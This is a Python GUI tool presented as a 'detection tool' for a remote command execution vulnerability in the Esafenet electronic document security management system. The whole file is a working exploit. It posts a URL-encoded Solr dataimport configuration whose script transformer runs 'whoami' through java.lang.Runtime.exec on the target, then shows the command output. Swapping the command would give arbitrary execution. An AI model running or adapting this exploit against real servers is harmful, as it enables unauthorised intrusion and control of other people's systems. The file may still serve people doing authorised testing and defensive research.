import re
# -*- coding:utf-8 -*-
# -*- by mert -*-
import requests
import tkinter as tk
from tkinter import messagebox
import urllib3
urllib3.disable_warnings()
def clear():
    output_text.delete("1.0", tk.END)
def rce():
    url = url_entry.get()
    data = '''<?xml version="1.0" encoding="UTF-8"?>
        <RDF>
            <item/>
        </RDF>'''
    try:
        response = requests.post(
            url + "/solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20",
            verify=False, data=data)
        response_text = response.text
        match = re.search(r'<arr name="title"><str>(.*?)</str></arr>', response_text, re.DOTALL)
        if match:
            extracted_text = match.group(1)
        if response.status_code == 200:
            result_text = f"存在亿赛通电子文档安全管理系统远程命令执行漏洞:\n{url}\n命令执行回显:\n{extracted_text}"
            print(result_text)
            output_text.insert(tk.END, result_text + "\n")

        else:
            messagebox.showinfo("温馨提示:", "不存在漏洞")
    except:
        pass
window = tk.Tk()
window.title("亿赛通电子文档远程命令执行检测工具")
window.configure(bg="#303030")
window.iconbitmap('imgs/ahon4-77wsm-001.ico')
window.resizable(False, False)
url_label = tk.Label(window, text="请输入检测的URL:", bg="#303030", fg="white") 
url_label.grid(row=0, column=0, padx=10, pady=10)
url_entry = tk.Entry(window, width=70)
url_entry.grid(row=0, column=1, padx=10, pady=10)
check_button = tk.Button(window, text="开始检测", command=rce)
check_button.grid(row=0, column=2, padx=10, pady=10)
clear_button = tk.Button(window, text="清屏", command=clear)  
clear_button.grid(row=0, column=3, padx=10, pady=10)
output_text = tk.Text(window, width=100, height=20)
output_text.grid(row=1, column=0, columnspan=4, padx=10, pady=10)
window.mainloop()